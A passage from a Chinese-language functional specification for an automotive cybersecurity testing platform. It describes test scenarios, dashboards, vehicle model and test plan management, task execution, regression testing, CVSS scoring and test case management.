title="功能实施方案"></a>功能实施方案</h4><ol><li>平台支持一系列全面的测试场景，包括功能测试场景，合规检测场景，自动化测试场景，以及其他多样化的测试场景。在功能测试场景中，平台能够对车辆的每一项功能进行详尽的测试，从而确保每个功能模块都能按照设计标准正常工作，并且用户体验符合预期。合规检测场景则侧重于验证车辆及其组件是否满足特定的法规和标准要求，这包括但不限于国际和国内的安全标准，如R155/GBT-40856等。自动化测试场景利用先进的自动化工具和技术，提高测试效率，减少人为错误，并且确保测试的连续性和一致性。除此之外，平台还支持其他测试场景，比如针对特定的安全威胁模拟攻击的场景，以及针对车辆在不同环境和条件下表现的耐久性和稳定性测试场景。这些多样化的测试场景为全面评估车辆的性能和安全性提供了强有力的支持，确保了测试结果的全面性和深度。</li></ol><h4 id="技术实现内容-20"><a href="#技术实现内容-20" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>测试场景功能提供了以下主要特点和描述：</p><ol><li>场景测试：</li></ol><p>平台支持多个维度的测试场景，包括硬件安全、数据安全、系统安全、软件安全和协议安全等。用户可以选择不同的测试场景来评估汽车系统在这些方面的安全性和合规性。</p><ol><li>支持多种硬件检测设备和协议</li></ol><p>平台支持蓝牙协议、GNSS（GPS）协议、WIFI协议等硬件检测设备。用户可以利用这些设备进行相关的测试，以验证汽车系统在这些协议上的安全性和合规性。</p><ol><li>风险点权重管理功能</li></ol><p>平台提供了对风险点的权重管理功能，用户可以根据实际情况重新分配权重，以准确评估风险的严重程度。这有助于用户更好地理解和处理不同风险点的重要性，并根据权重确定测试和修复的优先级。</p><ol><li>全面的自动化测试功能</li></ol><p>平台支持全面的自动化测试功能，包括固件自动拉取检测、二进制与应用漏洞检测等。用户可以利用自动化测试功能快速扫描和识别潜在的漏洞和安全问题。</p><ol><li>流程化半自动化测试功能</li></ol><p>平台提供了详细的流程化半自动化测试功能，例如GNSS欺骗测试、蓝牙欺骗测试等。用户可以按照指定的流程进行测试，并根据测试结果进行评估和分析。</p><ol><li>引导测试功能</li></ol><p>当无法自动化或半自动化实现测试时，平台支持简洁合理的引导测试功能作为补充。用户可以根据指导进行测试，并记录测试结果和评估。</p><ol><li>三方测试接入功能</li></ol><p>平台支持灵活的三方测试接入功能，用户可以根据测试模块协议自定义适配三方测试工具，并将其集成到平台中。这使得用户可以根据需求选择合适的三方测试工具，并与平台进行无缝集成。</p><p>通过测试场景功能，用户可以根据不同维度进行全面的安全测试，包括硬件安全、数据安全、系统安全、软件安全和协议安全等。平台提供了自动化、半自动化和引导测试等多种方式，以满足用户的不同测试需求，并支持灵活的三方测试工具接入。这将帮助用户全面评估汽车系统的安全性和合规性，发现潜在的漏洞和安全问题，并采取相应的措施进行修复和改进。</p><h4 id="功能布局"><a href="#功能布局" class="headerlink" title="功能布局"></a>功能布局</h4><h5 id="主页展示功能布局"><a href="#主页展示功能布局" class="headerlink" title="主页展示功能布局"></a>主页展示功能布局</h5><h6 id="功能实施方案-26"><a href="#功能实施方案-26" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>平台的用户界面设计精心考虑了用户的操作便捷性，提供了一系列直观的入口，包括可视化大屏入口、平台统计入口、车型测试管理入口、用例管理入口和知识库入口。这些入口不仅方便用户快速访问平台的核心功能，还通过图形化界面提升了信息的可读性和操作的直观性。例如，通过可视化大屏入口，用户可以一目了然地看到当前的测试概况和安全状况，而车型测试管理入口则让用户能够高效地管理和跟踪各车型的测试进度。用例管理入口和知识库入口则分别提供了对测试用例的细致管理和对安全知识的快速查询，以支持测试人员的日常工作。</li><li>功能快捷入口设计为用户提供了一种更加高效的工作方式，用户可以通过这些入口迅速执行常见操作。这些快捷入口包括新增样品、新增任务、新增用例、导出报告和系统状态等。这样的设计可以显著提高用户的工作效率，减少重复性和繁琐的操作步骤。无论是添加新的测试样品，创建新的测试任务，还是需要快速导出测试报告，用户都可以通过这些快捷入口以最小的操作步骤完成任务，同时系统状态入口提供了对平台运行状况的即时监控，确保测试活动可以顺利进行。</li><li>可视化大屏显示的设计旨在提供一个直观、易于理解的数据展示界面，它包含了车型、零部件漏洞排行，以及当前测试任务进度完成情况等重要信息。这些信息的可视化展示帮助测试团队和管理人员快速把握测试活动的整体状况，从而做出及时的决策。例如，漏洞排行可以揭示出哪些车型或零部件最容易受到威胁，而测试任务进度的实时更新则能够让团队成员掌握的最新进展。</li><li>统计数据展示内容丰富全面，涵盖了数量统计：已录入样品、已创建任务、已拥有用例、已测试结果、已挂载工具的总数；零部件样品类型排行；任务测试情况等。这些统计数据不仅提供了量化的分析视角，还通过排行和趋势分析等多种形式，帮助用户更深入地了解测试活动的各个方面。用户可以根据这些统计数据评估测试效率，分析测试覆盖度，以及优化资源分配。</li><li>平台在设计上充分考虑到了不同用户的需求和隐私保护，因此展示内容支持选择可见性。用户可以根据自己的角色和权限，选择性地查看或隐藏某些统计数据和测试结果。这种灵活的可见性选择既保障了敏感信息的安全，也提供了一个定制化的数据展示环境，让每个用户都能够看到对其最为相关和有用的信息。</li><li>车型测试管理入口是用户进入车型测试流程的主要通道。通过这个入口，用户可以访问到一个专门的测试管理界面，这里列出了所有车型的测试，用户可以轻松地添加新车型，启动新的测试流程，或者跟踪现有流程的进度。这个入口的设计使得测试管理变得条理清晰，便于操作。</li><li>车型测试管理入口不仅提供了对测试流程的访问，还支持测试系统框架结构的展示。这意味着用户可以在这个入口下获得对车型测试体系结构的全景视图，了解不同测试模块之间的关系和层次结构。这种结构化的展示有助于用户更好地理解测试系统的工作原理，以及各个部分如何协同工作以完成测试。</li><li>当测试人员进入车型测试管理入口后，平台支持在主界面显示“我的测试任务”相关统计，包括正在执行的任务、未执行的任务和已完成的任务等。这种个性化的统计展示能够让测试人员一眼看到自己责任范围内的所有任务状态，有效管理自己的工作。此外，一旦测试任务完成，平台还支持用户编辑测试时间及测试结果，并提交测试报告，从而确保测试活动的结果能够被准确记录和及时反馈。</li><li>平台在权限管理方面也做了精细的设计，根据用户的权限等级对测试统计内容、执行状态、状态等统计信息进行不同的展示。这意味着不同的用户根据其角色和权限能够看到不同层级的数据，确保信息的安全性和适当性。例如，高级管理人员可能能够查看全局的统计数据和状态，而普通测试人员则只能访问与自己相关的任务和状态信息。这样的权限控制既保护了数据的安全，也确保了用户能够高效地访问到对其工作有帮助的信息。</li></ol><h6 id="技术实现内容-21"><a href="#技术实现内容-21" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>多功能入口设计：</p><p>平台设计包括一个集成的界面，提供直观的可视化大屏入口，以便用户可以快速访问关键数据和信息。此外，还有专门的平台统计入口用于数据分析，车型测试管理入口用于协调和监控测试活动，用例管理入口用于组织和维护测试用例，以及知识库入口，方便用户访问技术文档和学习资源。</p><p>功能快捷入口：</p><p>平台提供一系列快捷入口，以提高用户效率和操作便捷性。这些包括新增样品、新增任务、新增用例、导出报告和查看系统状态等功能。这些快捷操作允许用户快速开始新的工作或查看当前系统的运行状况。</p><p>可视化大屏显示：</p><p>大屏幕显示功能提供了一个直观的仪表板，展示了车型和零部件漏洞的排行榜，以及当前测试任务的进度和完成情况。这有助于用户一目了然地把握关键的安全和测试信息。</p><p>统计数据展示内容：</p><p>数据统计展示功能包括各种关键指标的数量统计，如已录入的样品、已创建的任务、已拥有的用例、已完成的测试结果以及已挂载的工具总数。此外，还有零部件样品类型排行和任务测试情况的统计数据，帮助用户理解测试覆盖范围和质量。</p><p>可选内容可见性：</p><p>平台支持自定义展示内容的可见性，允许用户根据自己的需要和偏好选择要显示的数据和信息，从而优化用户体验和信息获取效率。</p><p>车型测试管理流程：</p><p>车型测试管理入口引导用户进入车型测试流程，这个流程是标准化的，确保所有测试工作都能按照既定的步骤和标准进行。</p><p>测试系统框架结构展示：</p><p>通过车型测试管理入口，用户可以查看测试系统的框架结构，这有助于用户理解测试环境的构建和各组件之间的关系。</p><p>我的测试任务统计与报告：</p><p>测试人员进入车型测试管理入口后，主界面会显示“我的测试任务”相关的统计信息，包括正在执行的、未执行的和已完成的任务。完成测试任务后，用户可以编辑测试时间和结果，并提交测试报告。</p><p>权限相关的统计信息展示：</p><p>平台根据用户的权限显示不同的测试统计内容、执行状态和状态。这确保了信息的安全性和个性化展示，同时也符合数据访问控制的最佳实践。</p><h5 id="车型管理功能布局"><a href="#车型管理功能布局" class="headerlink" title="车型管理功能布局"></a>车型管理功能布局</h5><h6 id="功能实施方案-27"><a href="#功能实施方案-27" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>车型管理模块是网络安全检测平台中的核心组成部分，它允许用户详细记录和管理各种车型的相关信息。在这个模块中，用户需要输入车型的基本信息，如车型名称和类型，这些是识别和区分不同车型的关键属性。除此之外，用户还可以填写车型的详细描述，以便更全面地了解车型的特点和用途。名称与车型关联，指明了车型所属的具体，而SOP节点则标识车型在标准操作流程中的具体阶段。费用号是与财务管理相关的重要信息，它帮助追踪和管理与车型相关的成本。测试接口人是负责该车型测试流程的联系人，确保测试活动的顺利进行。在车型管理中，还需记录总线拓扑结构等技术细节，这些信息对于理解车型的电子和网络架构至关重要。</li><li>测试项管理功能则更侧重于具体的测试活动和测试计划。这一部分涵盖了对内置控制器管理的配置，这些内置控制器是所有车型测试项的基础，它们为不同车型的测试提供了必要的硬件支持。在每个车型下，用户可以根据测试需求配置计划测试的控制器，并为每个控制器指定具体的测试项。测试项管理要求用户明确标记*测试对象（可能是控制器、整车等）、*测试方向（例如单件合规测试、渗透测试、IDS入侵测试等）、*所在网络（例如CAN、CANFD、ETH等），这些信息确保了测试活动的针对性和有效性。此外，用户还需要选择执行测试的用户（*测试执行），并可以为测试定义轮次，包括轮次名称、开始时间和结束时间，这有助于组织和跟踪测试工作的进展。</li><li>平台支持对车型信息的动态管理，包括新增、删除、修改车型信息的功能。这意味着用户可以根据的变化和需求的发展，随时更新车型信息库。新增功能允许用户添加新的车型记录，以适应新的测试需求；删除功能则可以去除不再需要的车型信息，保持信息库的整洁和更新；修改功能是对现有车型信息进行调整和更新，确保所有数据都是最新和最准确的。这些功能的灵活性和便捷性是管理大量车型信息的关键，也是确保测试活动能够基于最新数据进行的前提。</li><li>对于车型的创建和测试项的配置，平台实施了权限管理策略。这意味着只有拥有相应权限的用户才能进行这些操作。权限管理确保了数据的安全性和操作的合规性，避免了未授权的访问和修改。这种基于权限的操作限制强化了平台的安全性，同时也确保了每个用户都能在其权限范围内高效地完成工作。权限管理还体现了对测试流程的控制和监督，确保测试配置的正确性和一致性。</li></ol><h6 id="技术实现内容-22"><a href="#技术实现内容-22" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>车型管理功能详细描述：</p><p>车型管理是平台中用于维护和管理车辆型号信息的核心功能。用户可以在这里录入和查看车型的详细信息，包括：</p><p>车型名称：车辆型号的唯一标识。</p><p>类型：车辆的分类，如轿车、SUV、卡车等。</p><p>描述：对车型的详细描述，包括设计理念、特点等。</p><p>名称：车型关联的或测试计划的名称。</p><p>SOP节点：车型在标准操作流程（Standard Operating Procedure）中的具体阶段。</p><p>费用号：与车型相关的成本中心或费用账户。</p><p>测试接口人：负责该车型测试的主要联系人。</p><p>总线拓扑结构：车型的电子设备和网络布局，包括CAN总线和其他通信接口。</p><p>测试项管理功能详细描述：</p><p>测试项管理允许用户配置和管理不同车型的测试计划和控制器。功能包括：</p><p>内置控制器管理：一个集中库，存储所有可用于测试的控制器信息。</p><p>测试项配置：为每个车型配置计划内的测试控制器和相关测试项。</p><p>测试对象：指定测试的目标，例如控制器或整车。</p><p>测试方向：定义测试的类型，如单件合规性测试、渗透测试、IDS入侵测试等。</p><p>所在网络：指定控制器所在的网络类型，如CAN、CANFD、ETH等。</p><p>测试执行：分配负责执行测试的用户。</p><p>测试轮次：每轮测试的详细信息，包括轮次名称、开始时间和结束时间。</p><p>车型信息的维护：</p><p>平台提供了新增、删除和修改车型信息的功能，使用户能够根据的进展和需求更新车型数据。</p><p>权限管理：</p><p>创建车型和配置测试项需要相应的权限。这意味着只有被授权的用户才能进行这些操作，从而确保了平台数据的完整性和安全性。权限管理机制保护了敏感信息不被未授权访问，并确保了操作的合规性。</p><h5 id="计划管理功能布局"><a href="#计划管理功能布局" class="headerlink" title="计划管理功能布局"></a>计划管理功能布局</h5><h6 id="功能实施方案-28"><a href="#功能实施方案-28" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>在网络安全检测平台中，时间管理是测试过程中的一个关键要素，而权限设置则是确保时间管理有效性的基础。平台支持按照不同用户的权限设置不同的时间计划，以此来优化测试流程。测试接口人拥有制定车型对应测试项的测试时间的权限，他们可以根据需求和资源情况，安排合理的测试时间表。而测试执行人员，一旦被分配了任务，便可以查看到车型的测试项和规划时间，并在此基础上制定自己的测试时间，进而提交审批。这一流程确保了测试时间的合理分配和有效利用。一旦测试时间得到审批，便不可更改，这增加了计划的严谨性和执行的稳定性。这样的设计旨在提高测试的效率和准确性，同时保证了测试流程的规范性和可追溯性。</li><li>平台的一个重要功能是能够支持测试进度的实时展示，这不仅有助于测试团队跟踪测试活动，也方便管理层监控进展。平台能够显示不同被测对象在不同测试阶段的实际测试情况，并将其与预先制定的计划进行对比，从而判断测试活动是否按照既定计划进行。这种实时监控的机制可以及时揭示出偏差和潜在问题，为及时调整提供依据。同时，平台根据用户权限显示相关的统计数据，保证了信息的安全性和适当性。这种权限依赖的数据显示机制确保了每个用户都能够访问到对其角色和职责相关的信息，同时避免了敏感数据的不当泄露。</li><li>在测试管理中，能够追踪和统计任务执行次数是衡量测试效率和完成度的重要指标。平台支持显示计划内任务的测试执行次数，并能够以统计图的形式展现出计划时间内和延期状态的分布情况。这些统计图形提供了直观的视觉信息，帮助用户快速理解任务的执行状况。此外，平台还能够统计计划内任务的执行次数，为测试管理提供了量化的数据支持。所有这些统计信息的显示都是基于用户权限的，确保了数据的适当访问和使用。</li><li>测试计划的有效展示对于测试团队了解进度至关重要。平台支持测试计划的扁平化显示，即按照横向时间跨度将测试计划展示出来，直观地显示计划在年、月、周等时间单位上的跨度。这种横向排布的时间线对于把握整个测试周期和关键时间节点非常有帮助。同时，计划测试时间按照测试项纵向排布，这样的布局使得每个测试项的时间安排一目了然，便于测试团队成员理解自己的任务安排和时间限制。</li><li>为了确保测试活动的有序进行，平台支持设置测试轮次，用户可以根据测试需求制定轮次时间、测试项等信息。这些轮次信息的设置有助于将测试活动分解为更小的、更易于管理的单元，使测试过程更加条理化。轮次时间的指定确保了每一轮测试都有明确的开始和结束时间，而测试项的明确则保证了测试的针对性和全面性。</li><li>当测试时间计划被制定之后，平台提供了对测试项、测试任务、测试进度等多方面的统计功能。这些统计不仅直观显示了计划的进展和完成度，还包括了相关人员的参与度和测试次数等信息。各自的测试内容的查看，对应的测试技术人员可以通过在平台进行查看，而要查看该车型的全部统计信息则需要测试接口人才能进行。实验室负责人则拥有更高级别的权限，能够查看所有车型的统计信息。这样的权限分级和信息展示机制，确保了每个人都能够获得对其工作有帮助的信息，同时维护了数据的安全性和完整性。</li></ol><h6 id="技术实现内容-23"><a href="#技术实现内容-23" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>权限设置与时间计划管理：</p><p>平台支持基于角色的时间计划管理，确保不同权限的用户能够执行特定的操作：</p><p>测试接口人：负责制定每个车型对应的测试项的测试时间计划。</p><p>测试执行人员：能够查看车型的测试项和规划时间，并根据这些信息制定自己的测试时间计划，然后提交审批。</p><p>一旦测试时间计划被审批，便不能再进行修改，以确保测试流程的一致性和稳定性。</p><p>测试进度展示：</p><p>测试进度展示功能能够实时显示不同被测对象在不同测试阶段的实际测试情况，并与原计划进行对比。</p><p>用户能够根据其权限查看相应的统计数据，确保信息的透明性同时保护敏感数据。</p><p>任务执行次数和统计图表：</p><p>平台提供了对计划内任务的测试执行次数进行展示的功能，以及显示计划时间内和延期状态的统计图。</p><p>用户可以查看计划内任务的执行次数，并通过统计图直观地理解的进度和状态。</p><p>展示的统计数据会根据用户的权限进行调整，保障数据安全和个性化需求。</p><p>测试计划的时间跨度展示：</p><p>测试计划在界面上支持扁平化展示，即按照横向时间跨度展示，使用户可以直观地看到计划在年、月、周等时间单位上的分布。</p><p>测试时间计划横向排布，而测试项则纵向排布，以便用户能够清晰地理解测试计划的结构和时间线。</p><p>测试轮次设置：</p><p>用户可以为测试计划设置不同的测试轮次，并为每个轮次指定时间和测试项等信息。</p><p>这有助于将大型测试计划分解为更小、更易于管理的部分，同时也便于跟踪每个阶段的进度。</p><p>测试时间计划与统计信息：</p><p>一旦测试时间计划被制定，平台支持对测试项、测试任务、测试进度等进行统计，直观显示计划进展和完成度。</p><p>测试人员可以看到分配给自己的测试内容，关于该车型的相关统计信息，能被测试人全部查看，而实验室负责人则能够查看所有车型的统计信息。</p><p>这种信息的层级展示确保了工作的透明度，并允许不同角色的用户根据其职责和需要访问相关数据。</p><h5 id="任务管理功能布局"><a href="#任务管理功能布局" class="headerlink" title="任务管理功能布局"></a>任务管理功能布局</h5><h6 id="功能实施方案-29"><a href="#功能实施方案-29" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>测试执行人员在网络安全检测平台上具备创建和管理测试样件的能力，这一过程中涉及多个字段的管理。这些字段包括必填项如样件的名称、自动设置的所属车型、生产厂商，以及可操作的版本信息，其中版本号作为零部件的一个标签（tag）或者分支，允许用户进行创建、删除和修改操作。此外，还有描述、零部件号、样件开发状态、送件人、送件时间、软硬件版本以及最终样件去向等信息。这些管理字段的细致设置使得测试样件的管理变得更加系统化和规范化，为测试执行提供了完整的信息支持，确保了测试过程的准确性和可追溯性。</li><li>平台提供了便捷的功能，允许测试执行人员直接针对特定的测试样件创建测试任务。在任务管理界面内，用户能够创建测试任务并与相应的测试样件进行关联。这一设计简化了测试任务的创建流程，提高了工作效率，并确保了任务与样件之间的关联性，便于后续的测试执行和结果分析。</li><li>测试执行人员在平台上可以创建自己的测试任务，选择相关的测试项和测试对象，后者可以是自行创建的测试样件或整车。平台支持任务完成后的提交，一旦提交完成，该任务就不可再执行，确保了测试流程的严谨性。完成测试之后，还可以进行回归测试，此时可以编辑并选择新的测试样件。测试执行时间由系统自动记录，包括开始时间和完成时间，并在计划内自动增加测试次数，从而保持测试记录的准确性和完整性。</li><li>回归测试是测试过程中的一个重要环节，平台支持自动选择原测试任务未通过的测试用例进行回归测试，并允许用户根据需要更改（新增或取消）测试用例。这样的功能设计提高了回归测试的灵活性和针对性，有助于提高测试用例的质量和测试结果的准确性。</li><li>测试任务的制定不仅需要详细规划，还需要经过严格审批。平台支持上传测试内容计划，并提供测试内容审批功能。一旦测试内容通过审批，测试执行人员就按照计划中的内容进行测试。这一流程确保了测试活动的标准化和规范化，同时也保障了测试质量。</li><li>在现代测试环境中，多任务和多场景的并行执行变得尤为重要。平台支持任务的并行执行，以及多用户同时执行测试时的工具资源占用显示。用户可以看到等待队列和当前执行任务的状态信息。此外，平台还支持后台执行测试，即使切换或关闭界面，也不会影响测试的执行。当用户重新打开页面时，可以继续显示当前的测试进度，这一功能保证了测试活动的连续性和用户的工作效率。</li><li>测试任务的状态是测试管理中的关键信息，平台能够实时展示测试任务状态，包括但不限于正在执行、执行完毕、等待中等状态。这种实时展示功能为测试管理提供了即时的反馈，帮助测试团队及时调整测试计划和资源分配。</li><li>自动化测试任务是提高测试效率和准确性的有效手段。平台支持自动化任务的自动执行，用户只需预先配置选择的测试用例相关参数，平台就能够自动生成测试结果、生成关联漏洞和测试报告。这种自动化机制减少了人工干预，提高了测试的效率和可靠性。</li><li>任务回归是测试过程中用于确保测试质量的重要步骤。平台支持任务回归，同时保证不覆盖原任务的测试结果和测试报告。对于回归测试通过的测试项，平台能够自动关闭关联的漏洞缺陷，并更新状态为测试通过，这样的功能设计提高了测试流程的连续性和完整性。</li><li>在进行任务回归时，平台默认勾选上一次任务中失败（FAIL）的测试用例，以便用户专注于之前未通过的部分。此外，平台支持在测试报告中附录FAIL项的步骤，增加了测试报告的详细性和可用性。</li><li>对于非自动化测试任务，平台提供了对人工测试用例的支持。用户可以按照用例步骤上传图片、测试描述、测试结果选择等信息。这种功能设计有助于记录和展示测试过程的详细信息，提高了测试结果的可信度和可追溯性。</li><li>安全性测试中，对漏洞进行评分是评估风险的重要环节。平台支持对漏洞进行CVSS3.0评分，用户只需按照符合项的选项进行勾选，平台即可自动计算得分，出具漏洞评级，并将评级结果显示在测试报告中。这种自动化的评分机制保证了评分的一致性和准确性。</li><li>对于测试任务，平台支持查看测试结果的功能。测试结果的详情包括自定义测试步骤预览、自动化测试用例执行结果和选择信息。这样的功能设计提供了测试结果的全面视图，帮助用户深入理解测试过程和结果。</li><li>平台允许用户选择特定的测试用例进行执行。这种选择性执行的功能提高了测试的灵活性，允许用户根据实际需求进行有针对性的测试。</li><li>对于调用自动化工具的测试任务，平台提供了全面的自动化测试支持。用户可以通过统一配置参数窗口进行参数设置，测试用例在执行过程中全自动化，减少了人工干预，提高了测试的效率。</li><li>测试任务的参数存储是保证测试可重复性和稳定性的关键。平台支持任务参数的存储，测试任务的参数能够保存下来，下次执行时使用；也能够在存储的参数基础上，调整修改更新参数后执行，每次执行时都支持对参数的修改和参数值的清空等功能。这样的设计提高了测试的可控性和灵活性。</li><li>平台提供了对测试任务选择报告模板的功能，用户可以查看测试报告，并支持测试报告的下载功能。这样的功能设计提供了测试报告的定制化和便捷性。</li><li>测试任务完成后，平台支持打包下载测试内容计划、测试用例、测试log、测试报告等文件。这种打包下载的功能便于用户管理和存档测试相关的所有文件。</li><li>平台提供的测试任务管理界面支持查看相应测试任务信息，包括当前测试状态、测试结果等。这样的界面设计提供了测试任务的全面信息视图，便于用户进行测试管理和决策。</li><li>当用户在平台上选择测试项时，任务会自动关联相关的测试用例，并展示出来。这种自动关联的功能设计提高了测试准备的效率，并确保了测试的完整性。</li><li>任务执行功能支持测试用例的选择和参数配置，实时展示用例执行状态，包括用例的执行进度和结果等。这种实时展示的功能设计提供了测试执行的即时反馈，有助于用户监控和管理测试过程。</li><li>任务执行完成后，平台支持展示测试结果，并提供报告、log、测试用例（包含步骤）测试计划内容等文件包的下载。这样的功能设计便于用户进行测试结果的复查和分析。</li><li>平台支持创建手动测试任务，例如硬件测试，用户可以按照定义的用例步骤上传图片。在选择自定义用例执行时，用户可以根据用例步骤上传执行过程的图片、log等，并支持生成测试报告，以及报告的下载。这样的功能设计提高了手动测试的记录和报告的生成效率。</li></ol><h6 id="技术实现内容-24"><a href="#技术实现内容-24" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>测试样件管理：</p><p>测试执行人员可以创建和管理测试样件，这包括以下字段：</p><p>名称：测试样件的唯一识别名。</p><p>所属车型：自动与创建样件时选定的车型关联。</p><p>生产厂商：制造测试样件的公司。</p><p>版本：样件的版本号，作为区分不同样件的标签或分支，可创建、删除或修改。</p><p>描述：对测试样件的详细描述。</p><p>零部件号：测试样件的部件编号。</p><p>样件开发状态：标识样件是否处于开发、测试或完成状态。</p><p>送件人：交付测试样件的人员。</p><p>送件时间：样件交付的具体时间。</p><p>软硬件版本：样件所使用的软硬件版本信息。</p><p>最终样件去向：样件测试完成后的去向。</p><p>创建测试任务与样件关联：</p><p>可以直接为测试样件创建相关的测试任务，也可以在任务管理模块内创建测试任务并关联到特定样件。</p><p>测试任务的创建与执行：</p><p>测试执行人员可以创建自己的测试任务，选择测试项和测试对象（自行创建的测试样件或整车）。</p><p>支持任务完成提交，一旦提交后，该任务不可再执行。</p><p>对于完成的测试任务，可以进行回归测试，回归时可以选择新的测试样件。</p><p>测试任务的开始时间和完成时间自动记录，并在计划内增加测试次数。</p><p>回归测试任务：</p><p>回归测试会自动选择原测试任务中未通过的测试用例，并允许用户进行更改（新增或取消）。</p><p>测试内容计划与审批：</p><p>测试任务支持上传测试内容计划，并提供审批功能。通过审批的测试内容将按计划执行。</p><p>任务并行执行与资源管理：</p><p>支持多任务、多场景并行执行，并在多用户执行测试时显示工具资源的占用、等待队列和当前任务的执行状态。</p><p>支持后台执行测试，切换或关闭界面不会影响测试的执行，重新打开页面可以继续显示当前的测试进度。</p><p>测试任务状态实时展示：</p><p>实时展示测试任务的状态，如正在执行、执行完毕、等待中等。</p><p>自动化任务执行：</p><p>自动化任务会自动执行预先配置的测试用例，并自动生成测试结果、关联漏洞和测试报告。</p><p>任务回归与结果管理：</p><p>支持任务回归，不会覆盖原任务的测试结果和报告。对于回归通过的测试项，相关的漏洞缺陷会被关闭，并更新状态为测试通过。</p><p>回归任务的用例选择：</p><p>回归任务默认勾选上一次任务的FAIL项用例，并在测试报告中附录fail项的步骤。</p><p>非自动化测试任务的管理：</p><p>对于人工测试用例，支持按照用例步骤上传图片、测试描述、测试结果选择等信息。</p><p>漏洞评分：</p><p>支持使用CVSS3.0进行漏洞评分，用户通过勾选符合项即可自动计算得分，并在测试报告中显示漏洞评级。</p><p>查看测试结果：</p><p>支持查看测试任务的结果，详情包括自定义测试步骤预览、自动化测试用例的执行结果和选择信息。</p><p>测试用例执行选择：</p><p>支持用户选择特定的测试用例进行执行。</p><p>调用自动化工具的测试任务：</p><p>支持自动化测试，并提供统一的配置参数窗口，全自动化执行测试用例。</p><p>任务参数存储与管理：</p><p>每次执行任务时支持对参数进行修改或清空。</p><p>测试报告模板选择与查看：</p><p>支持选择报告模板，查看和下载测试报告。</p><p>测试任务文件打包下载：</p><p>支持打包下载测试内容计划、测试用例、测试log、测试报告等文件。</p><p>测试任务管理界面：</p><p>提供一个界面用于查看测试任务的相关信息，包括当前测试状态、测试结果等。</p><p>测试项与用例关联：</p><p>任务创建时支持自动关联相关的测试用例，并进行展示。</p><p>任务执行支持：</p><p>支持测试用例的选择和参数配置，实时展示用例的执行状态，如执行进度和结果。</p><p>任务执行完成后的管理：</p><p>完成任务后，支持展示测试结果，下载报告、log、测试用例和测试计划内容等文件包。</p><p>手动测试任务创建与报告生成：</p><p>支持创建手动测试任务，并在执行时上传执行过程的图片、log等。完成后，支持生成和下载测试报告。</p><h5 id="用例管理功能布局"><a href="#用例管理功能布局" class="headerlink" title="用例管理功能布局"></a>用例管理功能布局</h5><h6 id="功能实施方案-30"><a href="#功能实施方案-30" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>平台提供了一个全面的测试用例管理系统，允许用户自主编写测试用例，满足特定的测试需求。用户可以根据测试用例的性质和用途进行分类查询，方便地管理和检索。此外，平台还支持测试用例的添加、删除、修改等功能，使得测试用例库始终保持最新状态，确保测试的准确性和可靠性。这种灵活的测试用例管理功能，适应了多变的测试需求和快速迭代的开发环境，提高了测试的效率和质量。</li><li>为了提高测试过程中的效率和自动化程度，平台支持对测试用例进行编号管理。编号系统不仅方便了自动化测试脚本的开发，还使得在执行测试时能够快速调用相关用例。此种编号机制减少了测试执行过程中的复杂性，提供了一种直观且易于管理的方法来处理大量的测试用例，确保了测试活动的有序进行。</li><li>平台的设计允许测试用例与特定的测试项关联，便于按照测试项进行分类和组织。这种关联性和分类功能使得测试用例可以更加有序和系统地被执行和管理，同时也便于测试团队根据测试项的不同来选择合适的测试用例，提高了测试的有效性和针对性。</li><li>用户体验是平台设计的一个重要方面，测试用例在平台上的显示和管理功能都是清晰且易于理解的。通过合理的布局和层级结构，平台确保了用户在进行测试用例的选择、查看和操作时的流畅性，从而提高了用户的工作效率，减少了可能的操作错误。</li><li>测试用例的统一管理是确保测试质量的关键。平台上的测试用例可以根据类型、测试方向等多种条件进行筛选，同时展示每个测试用例的审批状态和被引用的次数等统计信息。这样的管理功能不仅提供了对测试用例使用情况的全面视图，还有助于测试团队评估和优化测试用例的有效性。</li><li>平台支持用户编写详细的测试用例步骤，并能够在测试结果中清晰地展示这些步骤。这适用于自动化测试用例（通过调用工具执行）和手动添加的测试用例。这种设计允许测试执行者对每个测试步骤有清晰的指导，同时也便于在测试完成后分析测试结果和步骤的对应关系。</li><li>针对特定的待测试设备或测试方向，平台允许应用特定的测试用例，这极大地提高了实际操作情景的便利性。用户可以根据实际的测试需求，将最适合的测试用例应用于相应的设备或测试场景中，确保了测试的针对性和实用性。</li><li>平台上的定制测试用例拥有编写、试用、发布等不同状态，并支持审核功能。在测试用例达到一定标准后，可以提交给实验室负责人进行审核，确保了测试用例的质量和一致性。一旦审核通过，测试用例即可更新到关联模块中，供测试团队使用。</li><li>测试用例的编写过程中，平台支持关联需求文档，包括需求类别、编号等信息。执行测试用例的测试任务可以查看到关联的需求文档，以及需求编号等详细信息。这种关联性确保了测试用例与实际需求之间的一致性，有助于测试团队准确理解测试目标和背景。</li><li>为了提高测试用例的编写和使用效率，平台支持上传用例模板。用户可以根据模板格式编写测试用例，同时支持按照模板格式下载测试用例。这种模板化的方法不仅提高了测试用例编写的效率，还确保了测试用例格式的统一性和标准化。</li></ol><h6 id="技术实现内容-25"><a href="#技术实现内容-25" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>测试用例自定义编写与管理：</p><p>平台支持测试用例的自定义编写，提供灵活的编辑器来编写和修改测试用例。</p><p>用户可以通过分类查询功能快速找到特定的测试用例，并进行添加、删除或修改操作。</p><p>测试用例编号管理：</p><p>每个测试用例都应有一个唯一的编号，以便于自动化测试脚本的开发和测试执行时的调用。</p><p>编号管理还有助于保持测试用例库的有序性和可追溯性。</p><p>测试用例与测试项关联：</p><p>测试用例应能够与相关的测试项关联，并按照测试项进行分类，以便于管理和执行。</p><p>测试用例的显示与层级管理：</p><p>测试用例在界面上的显示应清晰、层级分明，且布局合理。</p><p>用户在操作时应感到流畅，无需进行繁琐的页面跳转。</p><p>测试用例统一管理：</p><p>用户应能够根据类型、测试方向等条件筛选测试用例。</p><p>平台显示测试用例的审批状态和被引用次数等统计信息，以便用户了解每个用例的使用情况。</p><p>测试用例步骤编写与结果展示：</p><p>支持用户编写测试用例的具体步骤，并在测试结果中清晰展示这些步骤。</p><p>应区分自动化测试用例（调用工具执行